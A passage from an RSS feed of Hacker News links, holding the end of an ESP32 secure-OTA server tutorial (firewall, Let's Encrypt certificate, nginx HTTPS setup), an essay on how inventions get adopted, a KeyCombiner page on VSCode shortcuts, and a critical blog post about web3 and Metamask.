<div><pre data-setting="{&quot;mode&quot;:&quot;shell&quot;,&quot;mime&quot;:&quot;text/x-sh&quot;,&quot;theme&quot;:&quot;monokai&quot;,&quot;lineNumbers&quot;:true,&quot;styleActiveLine&quot;:false,&quot;lineWrapping&quot;:false,&quot;readOnly&quot;:true,&quot;showPanel&quot;:false,&quot;language&quot;:&quot;Shell&quot;,&quot;modeName&quot;:&quot;shell&quot;}">Available applications:
  Nginx Full
  Nginx HTTP
  Nginx HTTPS
  OpenSSH</pre></div>



<p>Then enable the following two options, OpenSSH and Nginx HTTPS.</p>



<div><pre data-setting="{&quot;mode&quot;:&quot;shell&quot;,&quot;mime&quot;:&quot;text/x-sh&quot;,&quot;theme&quot;:&quot;monokai&quot;,&quot;lineNumbers&quot;:true,&quot;styleActiveLine&quot;:false,&quot;lineWrapping&quot;:false,&quot;readOnly&quot;:true,&quot;language&quot;:&quot;Shell&quot;,&quot;modeName&quot;:&quot;shell&quot;}">sudo ufw allow 'OpenSSH'
sudo ufw allow 'Nginx HTTPS'</pre></div>



<p>You should get some response like the following: </p>



<div><div>
<div><pre data-setting="{&quot;mode&quot;:&quot;shell&quot;,&quot;mime&quot;:&quot;text/x-sh&quot;,&quot;theme&quot;:&quot;monokai&quot;,&quot;lineNumbers&quot;:true,&quot;styleActiveLine&quot;:false,&quot;lineWrapping&quot;:false,&quot;readOnly&quot;:true,&quot;showPanel&quot;:false,&quot;language&quot;:&quot;Shell&quot;,&quot;modeName&quot;:&quot;shell&quot;}">Rules updated
Rules updated (v6)</pre></div>



<p>Then, enable the firewall by typing.</p>







<p>You  will get the following response:</p>



<div><pre data-setting="{&quot;mode&quot;:&quot;shell&quot;,&quot;mime&quot;:&quot;text/x-sh&quot;,&quot;theme&quot;:&quot;monokai&quot;,&quot;lineNumbers&quot;:true,&quot;styleActiveLine&quot;:false,&quot;lineWrapping&quot;:false,&quot;readOnly&quot;:true,&quot;showPanel&quot;:false,&quot;language&quot;:&quot;Shell&quot;,&quot;modeName&quot;:&quot;shell&quot;}">Command may disrupt existing ssh connections. Proceed with operation (y|n)? y
Firewall is active and enabled on system startup</pre></div>



<p>At this point, no incoming connection may be accepted aside from the one on HTTPS port 443 and SSH on port 22.<br>When you try to go to www.lab4iot.site (your domain), you will just see connecting but actually your browser cannot connect to it, yet.</p>



<p>To check your firewall status, this command may come up as handy:</p>







<p>Your Nginx site content is located in <strong><em>/var/www/html/</em></strong></p>
</div></div>



<p>Your Nginx configuration for your site, since it is the default one, is located in <em><strong>/etc/nginx/sites-available/default</strong></em></p>



<h2>Setting up the Let’s Encrypt SSL certificate</h2>



<p>We will modify the settings in this file soon. Let’s set up the HTTPS Let’s Encrypt SSL certificate, which is free of charge. <strong>For the purpose of this demo, I used a Let’s Encrypt certificate, which needs to be renewed every three months (thanks for the comment THEAMK). Instead, you could use OpenSSL to generate self-signed certificates that you don’t need to renew every three months and download on your device. You can google how it is done with openssl.</strong> </p>



<p>We need to install the Let’s encrypt <strong>certbot</strong> that will install the certificate for us:</p>



<div><pre data-setting="{&quot;mode&quot;:&quot;shell&quot;,&quot;mime&quot;:&quot;text/x-sh&quot;,&quot;theme&quot;:&quot;monokai&quot;,&quot;lineNumbers&quot;:true,&quot;styleActiveLine&quot;:false,&quot;lineWrapping&quot;:false,&quot;readOnly&quot;:true,&quot;language&quot;:&quot;Shell&quot;,&quot;modeName&quot;:&quot;shell&quot;}">sudo apt install python3-certbot-nginx</pre></div>



<p>After you have installed it, to run it, execute the following commands, make sure to replace everything with your domain.</p>



<div><pre data-setting="{&quot;mode&quot;:&quot;shell&quot;,&quot;mime&quot;:&quot;text/x-sh&quot;,&quot;theme&quot;:&quot;monokai&quot;,&quot;lineNumbers&quot;:true,&quot;styleActiveLine&quot;:false,&quot;lineWrapping&quot;:false,&quot;readOnly&quot;:true,&quot;language&quot;:&quot;Shell&quot;,&quot;modeName&quot;:&quot;shell&quot;}">sudo certbot --server https://acme-v02.api.letsencrypt.org/directory -d lab4iot.site -d *.lab4iot.site --manual --preferred-challenges dns-01 certonly</pre></div>



<p>It will ask you a couple of questions, answer them and the response should look like:</p>



<div><pre data-setting="{&quot;mode&quot;:&quot;shell&quot;,&quot;mime&quot;:&quot;text/x-sh&quot;,&quot;theme&quot;:&quot;monokai&quot;,&quot;lineNumbers&quot;:true,&quot;styleActiveLine&quot;:false,&quot;lineWrapping&quot;:false,&quot;readOnly&quot;:true,&quot;language&quot;:&quot;Shell&quot;,&quot;modeName&quot;:&quot;shell&quot;}">/directory -d *.lab4iot.site --manual --preferred-challenges dns-01 certonly
Saving debug log to /var/log/letsencrypt/letsencrypt.log
Plugins selected: Authenticator manual, Installer None
Enter email address (used for urgent renewal and security notices) (Enter 'c' to
cancel): your_setup@email.com

- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Please read the Terms of Service at
https://letsencrypt.org/documents/LE-SA-v1.2-November-15-2017.pdf. You must
agree in order to register with the ACME server at
https://acme-v02.api.letsencrypt.org/directory
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
(A)gree/(C)ancel: A

- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Would you be willing to share your email address with the Electronic Frontier
Foundation, a founding partner of the Let's Encrypt project and the non-profit
organization that develops Certbot? We'd like to send you email about our work
encrypting the web, EFF news, campaigns, and ways to support digital freedom.
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
(Y)es/(N)o: N
Obtaining a new certificate
Performing the following challenges:
dns-01 challenge for lab4iot.site

- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
NOTE: The IP of this machine will be publicly logged as having requested this
certificate. If you're running certbot in manual mode on a machine that is not
your server, please ensure you're okay with that.

Are you OK with your IP being logged?
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
(Y)es/(N)o: Y

- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Please deploy a DNS TXT record under the name
_acme-challenge.lab4iot.site with the following value:

2r2n6NQRRxzxF7L6kw1VFfP1MC8YdlRXGKGv8oM2ga8

Before continuing, verify the record is deployed.
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</pre></div>



<p>Please add the <strong>TXT</strong> record in your DNS settings. </p>



<figure><img loading="lazy" width="1024" height="131" src="https://cdn.shortpixel.ai/client/q_lossless,ret_img,w_1024,h_131/https://www.lab4iot.com/wp-content/uploads/2021/02/txt_dns_record_lets_encrypt-1024x131.jpg" alt="" srcset="https://cdn.shortpixel.ai/client/q_lossless,ret_img,w_1024/https://www.lab4iot.com/wp-content/uploads/2021/02/txt_dns_record_lets_encrypt-1024x131.jpg 1024w, https://cdn.shortpixel.ai/client/q_lossless,ret_img,w_300/https://www.lab4iot.com/wp-content/uploads/2021/02/txt_dns_record_lets_encrypt-300x38.jpg 300w, https://cdn.shortpixel.ai/client/q_lossless,ret_img,w_768/https://www.lab4iot.com/wp-content/uploads/2021/02/txt_dns_record_lets_encrypt-768x98.jpg 768w, https://cdn.shortpixel.ai/client/q_lossless,ret_img,w_1245/https://www.lab4iot.com/wp-content/uploads/2021/02/txt_dns_record_lets_encrypt.jpg 1245w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Added TXT DNS record.</figcaption></figure>



<p>Before you press enter, please check that the record matches the settings provided by Let’s encrypt by typing (but type this on your <strong>host machine, not server machine</strong>):</p>



<div><pre data-setting="{&quot;mode&quot;:&quot;shell&quot;,&quot;mime&quot;:&quot;text/x-sh&quot;,&quot;theme&quot;:&quot;monokai&quot;,&quot;lineNumbers&quot;:true,&quot;styleActiveLine&quot;:false,&quot;lineWrapping&quot;:false,&quot;readOnly&quot;:true,&quot;language&quot;:&quot;Shell&quot;,&quot;modeName&quot;:&quot;shell&quot;}">dig _acme-challenge.lab4iot.site TXT</pre></div>



<p>You will get something as the following in the response:</p>



<div><div>
<div><div>
<div><div>
<div><pre data-setting="{&quot;mode&quot;:&quot;shell&quot;,&quot;mime&quot;:&quot;text/x-sh&quot;,&quot;theme&quot;:&quot;monokai&quot;,&quot;lineNumbers&quot;:true,&quot;styleActiveLine&quot;:false,&quot;lineWrapping&quot;:false,&quot;readOnly&quot;:true,&quot;showPanel&quot;:false,&quot;language&quot;:&quot;Shell&quot;,&quot;modeName&quot;:&quot;shell&quot;}">; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.12-Ubuntu &lt;&lt;&gt;&gt; _acme-challenge.lab4iot.site TXT
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 50125
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 65494
;; QUESTION SECTION:
;_acme-challenge.lab4iot.site.	IN	TXT

;; ANSWER SECTION:
_acme-challenge.lab4iot.site. 34 IN	TXT	"2r2n6NQRRxzxF7L6kw1VFfP1MC8YdlRXGKGv8oM2ga8"

;; Query time: 0 msec
;; SERVER: 127.0.0.53#53(127.0.0.53)
;; WHEN: Sun Oct 04 16:52:14 CEST 2020
;; MSG SIZE  rcvd: 113</pre></div>



<p>Once you can see it, go to your server ssh terminal and press enter, you should get a message where it says things have been setup successfully:</p>
</div></div>



<div><pre data-setting="{&quot;mode&quot;:&quot;shell&quot;,&quot;mime&quot;:&quot;text/x-sh&quot;,&quot;theme&quot;:&quot;monokai&quot;,&quot;lineNumbers&quot;:true,&quot;styleActiveLine&quot;:false,&quot;lineWrapping&quot;:false,&quot;readOnly&quot;:true,&quot;showPanel&quot;:false,&quot;language&quot;:&quot;Shell&quot;,&quot;modeName&quot;:&quot;shell&quot;}">Press Enter to Continue
Waiting for verification...
Cleaning up challenges

IMPORTANT NOTES:
 - Congratulations! Your certificate and chain have been saved at:
   /etc/letsencrypt/live/lab4iot.site/fullchain.pem
   Your key file has been saved at:
   /etc/letsencrypt/live/lab4iot.site/privkey.pem
   Your cert will expire on 2021-01-02. To obtain a new or tweaked
   version of this certificate in the future, simply run certbot
   again. To non-interactively renew *all* of your certificates, run
   "certbot renew"
 - If you like Certbot, please consider supporting our work by:

   Donating to ISRG / Let's Encrypt:   https://letsencrypt.org/donate
   Donating to EFF:                    https://eff.org/donate-le
</pre></div>



<h2>Setting up the Nginx server</h2>



<p>Now we can proceed to set up the nginx server. Go to the nginx settings folder:</p>



<div><pre data-setting="{&quot;mode&quot;:&quot;shell&quot;,&quot;mime&quot;:&quot;text/x-sh&quot;,&quot;theme&quot;:&quot;monokai&quot;,&quot;lineNumbers&quot;:true,&quot;styleActiveLine&quot;:false,&quot;lineWrapping&quot;:false,&quot;readOnly&quot;:true,&quot;language&quot;:&quot;Shell&quot;,&quot;modeName&quot;:&quot;shell&quot;}">cd /etc/nginx/available-sites</pre></div>



<p>Edit the settings file:</p>
</div></div>







<p>Copy the following content over your existing <strong>“server”</strong> configuration:</p>



<div><pre data-setting="{&quot;mode&quot;:&quot;shell&quot;,&quot;mime&quot;:&quot;text/x-sh&quot;,&quot;theme&quot;:&quot;monokai&quot;,&quot;lineNumbers&quot;:true,&quot;styleActiveLine&quot;:false,&quot;lineWrapping&quot;:false,&quot;readOnly&quot;:true,&quot;fileName&quot;:&quot;default&quot;,&quot;language&quot;:&quot;Shell&quot;,&quot;modeName&quot;:&quot;shell&quot;}">server {
        server_name lab4iot.site www.lab4iot.site *.lab4iot.site;

        listen 443 ssl;
        listen [::]:443 ssl;
        ssl_certificate /etc/letsencrypt/live/lab4iot.site/fullchain.pem;
        ssl_certificate_key /etc/letsencrypt/live/lab4iot.site/privkey.pem;

        root /var/www/html;

        # Add index.php to the list if you are using PHP
        index index.html index.htm index.nginx-debian.html;


        location / {
                # First attempt to serve request as file, then
                # as directory, then fall back to displaying a 404.
                try_files $uri $uri/ =404;
        }
}</pre></div>



<p>Make sure you replace lab4iot.site with your own domain name (check that certbot saved the certificates in the same path as it did for me.)<br>Save it. Then test the Nginx configuration by typing:</p>
</div></div>







<p>This command should tell you that everything in the settings file is OK:</p>



<div><div>
<div><pre data-setting="{&quot;mode&quot;:&quot;shell&quot;,&quot;mime&quot;:&quot;text/x-sh&quot;,&quot;theme&quot;:&quot;monokai&quot;,&quot;lineNumbers&quot;:true,&quot;styleActiveLine&quot;:false,&quot;lineWrapping&quot;:false,&quot;readOnly&quot;:true,&quot;showPanel&quot;:false,&quot;language&quot;:&quot;Shell&quot;,&quot;modeName&quot;:&quot;shell&quot;}">nginx: the configuration file /etc/nginx/nginx.conf syntax is ok
nginx: configuration file /etc/nginx/nginx.conf test is successful</pre></div>



<p>Then reload the Nginx server configuration:</p>



<div><pre data-setting="{&quot;mode&quot;:&quot;shell&quot;,&quot;mime&quot;:&quot;text/x-sh&quot;,&quot;theme&quot;:&quot;monokai&quot;,&quot;lineNumbers&quot;:true,&quot;styleActiveLine&quot;:false,&quot;lineWrapping&quot;:false,&quot;readOnly&quot;:true,&quot;language&quot;:&quot;Shell&quot;,&quot;modeName&quot;:&quot;shell&quot;}">sudo /etc/init.d/nginx reload</pre></div>



<p>You should be able to access your web site only by <strong>https://lab4iot.site</strong> as well as <strong>https://<em>www</em>.lab4iot.site</strong><br>Both links should produce a green keylock.</p>
</div></div>



<div><figure><img loading="lazy" src="https://cdn.shortpixel.ai/client/q_lossless,ret_img,w_363,h_327/https://www.lab4iot.com/wp-content/uploads/2021/02/server_traffic_encrypted_https.jpg" alt="" width="363" height="327" srcset="https://cdn.shortpixel.ai/client/q_lossless,ret_img,w_363/https://www.lab4iot.com/wp-content/uploads/2021/02/server_traffic_encrypted_https.jpg 363w, https://cdn.shortpixel.ai/client/q_lossless,ret_img,w_300/https://www.lab4iot.com/wp-content/uploads/2021/02/server_traffic_encrypted_https-300x270.jpg 300w" sizes="(max-width: 363px) 100vw, 363px"><figcaption>Web server traffic is encrypted now</figcaption></figure></div>



<p>Finally we are done with setting up the web server, …</p></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.lab4iot.com/2021/02/21/esp32-secure-firmware-update-over-the-air-ota/">https://www.lab4iot.com/2021/02/21/esp32-secure-firmware-update-over-the-air-ota/</a></em></p>]]>
            </description>
            <link>https://www.lab4iot.com/2021/02/21/esp32-secure-firmware-update-over-the-air-ota/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26223293</guid>
            <pubDate>Mon, 22 Feb 2021 11:28:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Invented, allowed, adopted. How new ideas become things in the world in 3 stages]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26223031">thread link</a>) | @amicoleo
<br/>
February 22, 2021 | https://www.orgonomyproductions.info/notes/notes/2021/02/13/InventedEnabledAdopted.html | <a href="https://web.archive.org/web/*/https://www.orgonomyproductions.info/notes/notes/2021/02/13/InventedEnabledAdopted.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        





<article itemscope="" itemtype="https://schema.org/BlogPosting">

  


  <div itemprop="articleBody">
    <p>What did a new idea have to go through before becoming a real thing and have a role in people lives? From scattered readings in recent and historical innovation examples, I picked up a pattern. To have an impact on the world, new ideas had to overcome three stages: they were first invented, then allowed, and finally adopted. Here are some examples of when they didn’t make it.</p>

<p><strong>Stage 1 - Invented</strong></p>

<p>An idea is invented when it moves from mind space to the real world. That means to consider the technical aspects necessary to realise the idea. A prototype is usually a solid sign that an idea was invented.</p>

<p>With that definition then, not invented ideas are the ones that remain only on paper. Reading Leonardo’s biography, it’s impressive to see how many interests he had. But I was even more surprised to learn how little Leonardo actually made. One good argument is that at his time, the beginning of 1500, there just wasn’t much incentive in technical entrepreneurship. What you could do with ideas was to pitch it to lords, and the things they cared about was war and prestige, and not making money with technological innovations.
Also, Leonardo was a perfectionist. He famously took years to make a painting and in all his life he painted only a few of them. No way we can expect him to have built an MVP of a flying machine.</p>

<p>More close to our times, past the Industrial Revolution, technical innovation in factories could actually make people rich. So what could kill ideas in this scenario, is that they could not be realisable. For instance, in the second half of the 1800s, Charles Babbage came up with the idea of the analytic machine, a precursor of a programmable computer, but never managed to build any of it. What would have been a fifteen-ton contraption, with over 25,000 mechanical parts, was just not ready to be created using the technology of the time.</p>

<p>For an overall picture of which ideas can be invented and which not, I like the notion of <em>adjacent possible</em>. The precondition for new ideas to be invented is that they can be made from the current technological and social conditions. No big leaps are allowed, at best an expansion of what it can be done already. But I don’t see this as a limit. As <a href="https://www.orgonomyproductions.info/notes/notes/2021/01/22/MunariWasACreativeTechnologist.html">I wrote before referring to Bruno Munari</a>, technology can be a powerful inspiration. And by getting hands-on with it as early as possible, you can make sure that a new idea can be actually produced.</p>

<p><strong>Stage 2 - Allowed</strong></p>

<p>When an idea successfully made into the realm of the possible, the first new obstacle is to be allowed. And that means that the organisation within which that invention was created enables or at least don’t stop the invention to get produced. (The exception are startups, but even then investors act as the gatekeepers with the power to enable or not a new business idea).</p>

<p>Before the industrial revolution, technical innovations were sometimes restricted by rulers. Especially when their application would affect employment. For instance in 1589 in England, Queen Elizabeth I refused a patent for a knitting machine, with the reason that would leave people without work. And a few years later, also in England, King Charles I banned the casting of buckets, to protect the craftsman that were making buckets in the traditional way.</p>

<p>But in that pre-industrial, and less economy-driven world, culture played a part too. My favourite example in the history of innovation is from Japan. After the Portugueses imported primitive weapons into the country in late 1500, Japan started improving and manufacturing their own design, and soon become a world leader in gun production. But traditionally, samurai wars involved ritualistic sword fights, and that was all ruined if guns were also used. So the samurai ruling class first restricted and finally banned their production in the whole country, and 200 years later in Japan there was almost no working guns left.</p>

<p>In recent years, this stage mostly takes place within companies. The most likely reason why Xerox failed to successfully bring to market the personal computer they invented, was that management didn’t believe enough in a product that would damage their main photocopying business. And at Kodak, they patented and built the first digital camera in 1975, and although did make money from the patent, the company never marketed the product until too late. Letting other company eventually kill their film monopoly, that they tried so hard to protect. Probably those lessons were learned. And on the other end of the spectrum, you have Amazon, which despite making the most money selling physical books, developed and in 2007 launched the Kindle e-Book reader.</p>

<p>Something can be said here on being too strict on user-centredness. Final customer as the only focus in the design work would maybe result in the best invention possible. But if that invention fails to be produced because it’s not allowed by its organisation, even the best user-centred invention is useless if people are not going to see it.</p>

<p><strong>Stage 3 - Adopted</strong></p>

<p>After an idea is invented and released into the world, the last challenge it faces is to be accepted and adopted by its final users. I don’t have historical examples of such failures, but there are some interesting recent ones to mention. The first one is of the Segway. First example of urban micro-mobility, it never took off among the public and in 2020 its production was stopped, while its heritage lives on in the rental scooter now available in many cities. Another example is of Google Glass. Impressive invention, a full backing by Google and a huge opposition from the public. For a brief period in 2013, it looked like the future of wearable augmenting technology was already among us, except that too many people could not stand to share bars and public places with enthusiastic early adopters “glass-holes”, going around with an all-recording Google camera on their face. The last example is One Laptop Per Child. MIT’s Nicholas Negroponte $100 solar-powered laptop. It was meant to bring computers to every child in the world. Estimated to sell between 5 to 15 million products, “only” 600K were sold since its launch. A too ambitious program with probably not enough consideration of the context where the computer was meant to be used.</p>

<p>Those adoption failures were due to many different causes, so it would be impossible to try explain them all with some simple reasons. In general, I believe that building iteratively, and integrating as much as possible feedback from the final adopters during development, is the best chance to make sure people will not reject a new idea when out there.  But is that what went wrong with the Segway and Google Glass? I wouldn’t know.</p>

<hr>

<p><strong>References</strong></p>

<p>Jared Diamond - Guns, Germs and Steel</p>

<p>Carl Benedikt Frey - The Technology Trap</p>

<p>Steve Johnson - Where Good Ideas Come From</p>

<p><a href="https://lens.blogs.nytimes.com/2015/08/12/kodaks-first-digital-moment/?_r=0#">Kodak’s First Digital Moment - The New York Times</a></p>

<p><a href="https://www.forbes.com/sites/tendayiviki/2017/07/01/as-xerox-parc-turns-forty-seven-the-lesson-learned-is-that-business-models-matter/">As Xerox PARC Turns 47, The  Lesson Learned Is That Business Models Matter</a></p>

<p><a href="https://www.theverge.com/2018/4/16/17233946/olpcs-100-laptop-education-where-is-it-now">OLPC’s $100 laptop was going to change the world — then it all went wrong - The Verge</a></p>


  </div>

  
</article>



      </div>


    </div></div>]]>
            </description>
            <link>https://www.orgonomyproductions.info/notes/notes/2021/02/13/InventedEnabledAdopted.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26223031</guid>
            <pubDate>Mon, 22 Feb 2021 10:51:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I made an app to learn and look up VSCode's keyboard shortcuts]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26222865">thread link</a>) | @tkainrad
<br/>
February 22, 2021 | https://keycombiner.com/vscode/ | <a href="https://web.archive.org/web/*/https://keycombiner.com/vscode/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="contentdiv"><div id="contentblock"><div><div><div><p>KeyCombiner improves your VSCode workflows in several ways. Here are three concrete examples.</p></div></div><div><div><h2>1. Learn the Keyboard Shortcuts</h2><p>Increase your efficiency when working with VSCode by learning its keyboard shortcuts. KeyCombiner's typing trainer uses flashcard and spaced repetition techniques to facilitate keyboard shortcut learning. You can learn tens or even hundreds of keyboard shortcuts in minimal time. <br> We are not just saying that; read how <a href="https://tkainrad.dev/posts/how-i-learned-50-new-keyboard-shortcuts-in-42-minutes/" rel="noopener" target="_blank">How KeyCombiner's creator learned 50 new keyboard shortcuts in 42 minutes</a>.</p><p>Scroll down to try out the interactive trainer with some of VSCode's keyboard shortcuts right here on this page.</p></div></div><div><div><h2>2. Instantly Look up Shortcuts and Commands</h2><p><a href="https://keycombiner.com/desktop/">KeyCombiner Desktop</a> enables you to instantly look up all shortcuts that are in your collections <b>plus those of the currently active application</b>.</p><p>This means, whenever you are working in VSCode, you can press <kbd>Super</kbd>+<kbd>Alt</kbd>+<kbd>C</kbd> on Windows and Linux, or <kbd>Shift</kbd>+<kbd>Cmd</kbd>+<kbd>K</kbd> on macOS and KeyCombiner will show you VSCode's keyboard shortcuts. This way, you don't need to leave your current context, and can return to work immediately afterward.</p><p>If you are interested in how this works in detail, we have written a blog post about it:<br><a href="https://tkainrad.dev/posts/app-to-show-shortcuts-of-current-application-windows-linux-macos/" rel="noopener" target="_blank">An app to show the shortcuts of the current application for Windows, Linux, and macOS.</a></p></div></div><div><div><h2>3. Find the right VSCode Shortcuts for your Workflows</h2><p>KeyCombiner's collection tables can be searched, filtered, and sorted in more ways than you can imagine. In one click, you can filter by category or modifier combination, or for any key on the keyboard. Of course, there is also full text search.</p><p>We don't stop there though. KeyCombiner's collection visualizer maps all of VSCode's keyboard shortcuts onto a virtual keyboard. This helps to find relationships between key bindings, or to identify free combinations, in case you like to organize your own key bindings.</p><p>By the way, we have a blog post about that, too: <a href="https://tkainrad.dev/posts/visualize-collections-of-keyboard-shortcuts/" rel="noopener" target="_blank">An Interactive Virtual Keyboard to Visualize any Collection of Shortcuts</a></p></div></div><hr><div><div><h2>1. Select Shortcuts from KeyCombiner's public&nbsp;<img alt="VSCode logo" src="https://keycombiner.com/media/application-icons/vscode_QpYl3Cj.png">VSCode collection</h2></div></div><div><div><p>KeyCombiner's <a href="https://keycombiner.com/collections/vscode/">public VSCode collection</a> has 161 entries. Select exactly those that you need for your workflow and add them to your personal collections.</p><p>KeyCombiner will always show you which combinations of a public collection are already in your collections, so you don't lose track when gradually expanding your knowledge.</p><p>All shortcuts in your personal collections will always be available in <a href="https://keycombiner.com/desktop/">KeyCombiner Desktop</a>'s instant lookup. Next time you are trying to remember a VSCode shortcut, you don't need to suffer a context switch by searching on the Web.</p></div><p><img alt="Training Statistics" src="https://keycombiner.com/static/images/collecting.43113ea73660.gif"></p></div><div><h2>2. Go to your KeyCombiner Dashboard and click <i>Practice</i></h2><p>KeyCombiner's interactive trainer can be used with any of your collections. It comes with a flashcard inspired learning experience. Spaced repetition algorithms maximize learning efficiency. You can try out KeyCombiner's interactive trainer with a random selection of 20 VSCode shortcuts right here.</p><p>If you create an account, you can choose exactly which shortcuts you want to practice. You can combine your VSCode practice with 70+ other applications for which KeyCombiner has <a href="https://keycombiner.com/collections/">a public collection</a> or define new key combinations from scratch. KeyCombiner will save detailed statistics and use them to speed up your learning progress.</p></div><hr><div><div><p>Browsing the official documentation or printing out a list of keyboard shortcuts is great, but it does not scale well when you are searching for a specific entry among hundreds of key bindings.</p><p>KeyCombiner's collection tables offer a range of features that you won't find anywhere else.</p><ul><li>Collection visualizer that maps the 161 VSCode keyboard shortcuts onto a virtual keyboard.</li><li>Show key bindings for Windows, Linux, macOS individually, or side-by-side.</li><li>Full text search on the entire data, or limited to a description, keys, or category.</li><li>One-click filtering by category or combination of modifiers.</li><li>Click on a virtual keyboard button to filter the collection table for all combinations containing the respective key.</li><li>Sort by category, keys, description, or combination of modifiers.</li><li>Instantly pull up the current application's shortcuts, and the entirety of your personal collections with KeyCombiner Desktop's instant lookup.</li><li>Export VSCode's keyboard shortcuts to PDF, CSV, and XLSX.</li></ul></div></div></div></div></div></div>]]>
            </description>
            <link>https://keycombiner.com/vscode/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26222865</guid>
            <pubDate>Mon, 22 Feb 2021 10:26:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[web3 is a Stupid Idea]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26222849">thread link</a>) | @Bluestein
<br/>
February 22, 2021 | https://timdaub.github.io/2020/09/08/web3/ | <a href="https://web.archive.org/web/*/https://timdaub.github.io/2020/09/08/web3/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>A long time ago, I gave a talk in front of a full audience talking about BigchainDB, a company I worked for to create a (scalable) decentralized database. As we just had released our browser-compatible JavaScript driver, enthusiastically, I told the audience: "... and so by using our driver from within the browser, your app won't need a backend anymore"!</p>
<p>That must have been around 2017 when I first discovered Metamask, and started drinking Ethereum's web3 cool-aid. Arguably, web3 quickly became something extraordinary. All of a sudden, users could download a browser extension and directly interact with a public network. In a sense, it still is extraordinary.</p>
<p>If you have an extension like Metamask installed in your browser today, you can visit sites on the web that allow you to do the craziest things with your digital money. An excellent recent example of this are DeFi (short for "Decentralized Finance") websites. They allow a user to engage in trading cryptocurrencies, providing liquidity, and peer to peer lending. With the click of a button and no mandatory signups, you're able to pool thousands of dollars. That is super cool and confirms the viability of the web3 vision.</p>
<p>But actually, what is the web3 vision? It may be that there never was such a thing in the first place. All I know is that someone named a library "web3.js". Developers use it to talk to remote or local Ethereum nodes when working in a browser environment (JavaScript).</p>
<p>On a web3-enabled website, when a user now clicks a button to, e.g., pool ether in a smart contract, most calculations are supported by the web3.js library that periodically talks to an Ethereum node. Ultimately web3.js allows the user to send the transaction to the node to transfer the user's money.</p>
<p>Often, a key-management program, like Metamask, is running on the user's browser. It allows the user to sign transactions with the same key on different websites.</p>
<p>In a nutshell, that's web3. It's supposed to be a play on words regarding "web 2.0". Web 2.0 is the upgrade of web standards that gave us modern single-page applications and dynamic AJAX loading. And Web3? An advancement towards what exactly? Money websites?</p>
<p>Indeed, if you were capable of cleaning your mind of specific memories, specifically, let's say you could do <code>grep -l web3 brain | xargs rm</code>. And then someone asked you how you'd envision a blockchain-based and smart-contract-enabled web3; you'd likely describe an ecosystem vastly different to what it is today. You'd think about peer-2-peer networks, light clients, and renewed web standards. That's precisely not web3.</p>
<p>In today's experience it will instead be mostly shitty react websites that crash or stop working when you've neglected to install Metamask (or other key-management plugins). Opening a web3 website's network console, you'll see that it's making an excessive amount of RPC request to an Ethereum full node. Sorry, I meant to say Infura node, a hugely-popular cloud provider hosting Ethereum full nodes. That's kinda stupid.</p>
<p>And since Metamask allows developers to prompt the user for specific contract calls, what's even more stupid, is that all your money may be at the risk of continually getting stolen with the accidential click of a button. Either by someone hacking the website's server. Or by the website provider becoming corrupt themselves. Or simply because a website pretends to do X when it does Y (stealing all your money).</p>
<p>But instead of continuing to rant, I'd now like to now point out what I think should change about web3:</p>
<ul>
<li>We should stop building key-management plugins and start thinking about a standardizable web API. We must stop training our users to install shitty browser plugins!</li>
<li>We need to make light clients work as soon as possible and become independent from third-party services like thegraph and Infura.</li>
<li>We need to improve our client libraries (ethers.js and web3.js) by dramatically simplifying them and making them bug-free (god damn it!)!</li>
<li>We need to take advantage of some of the blockchain's fundamental properties. Most data is immutable so let's start caching things.</li>
</ul>
<p>And finally, I think we should stop focusing all of our attention on bumping the web's version number. Maybe we should reconsider writing more backends. We should promote more work on permissionless networks like Open Gas Station Network that allow developers to upgrade a user's experience. And, we should start thinking of a machine network of blockchains more often. In many ways, web3 was just a cool demo. But let's come up with something better. Just imagine what happens once there's a deeper integration of money into computer systems!</p>

  </div></div>]]>
            </description>
            <link>https://timdaub.github.io/2020/09/08/web3/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26222849</guid>
            <pubDate>Mon, 22 Feb 2021 10:24:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Philosophical Roots of Sweden’s Pandemic Strategy]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26222756">thread link</a>) | @imartin2k
<br/>
February 22, 2021 | https://macrinamagazine.com/issue-6-general/guest/2021/02/20/the-justice-of-gold-the-philosophical-roots-of-swedens-pandemic-strategy/ | <a href="https://web.archive.org/web/*/https://macrinamagazine.com/issue-6-general/guest/2021/02/20/the-justice-of-gold-the-philosophical-roots-of-swedens-pandemic-strategy/">archive.org</a>
